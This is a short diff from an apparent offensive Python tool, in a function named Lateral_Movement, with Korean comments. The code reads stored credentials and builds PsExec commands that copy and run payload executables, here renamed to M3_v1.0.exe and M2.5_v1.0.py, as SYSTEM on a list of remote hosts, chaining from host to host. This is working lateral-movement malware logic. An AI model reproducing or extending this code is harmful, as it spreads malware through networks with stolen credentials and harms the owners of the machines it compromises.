@@ -206,7 +206,7 @@ def Lateral_Movement():
         for i in range(len(list)):
             lines = line[0].split(".")
             return_code = subprocess.Popen('C:\module2\DownloadFile-main\PsExec.exe -s \\\\' +
-                                           list[i] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2\DownloadFile-main\everything.exe')
+                                           list[i] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2\DownloadFile-main\M3_v1.0.exe')
         f.close()
 
         # 현재 pc와 리스트의 DNS가 같을 때 리스트의 다음 DNS로 측면이동 모듈2.5 전송
@@ -222,7 +222,7 @@ def Lateral_Movement():
                 j = i
                 for j in range(len(list)-1):
                     return_code = os.system('start cmd /k C:\module2.5\DownloadFile-main\PsExec.exe -s \\\\' +
-                                            list[j+1] + ',\\\\' + list[j+2] + ',\\\\' + list[j+3] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2.5\DownloadFile-main\everything.exe')
+                                            list[j+1] + ',\\\\' + list[j+2] + ',\\\\' + list[j+3] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2.5\DownloadFile-main\M2.5_v1.0.py')
         f.close()
         f1.close()
         info_List.append(('Lateral Movement', 'Ok'))
